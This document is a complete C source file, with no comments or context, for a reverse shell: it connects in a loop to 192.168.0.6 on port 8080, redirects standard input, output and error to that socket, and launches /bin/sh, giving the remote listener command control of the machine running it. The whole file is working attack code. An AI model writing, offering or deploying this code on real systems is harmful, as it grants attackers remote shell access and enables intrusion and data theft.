#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
	int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (s < 0) {
		return 1;
	};

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("192.168.0.6");
	addr.sin_port = htons(8080);

	while (connect(s, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
	};

	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);

	char *shell = "/bin/sh";

	execve(shell, NULL, NULL);

	return 0;
};
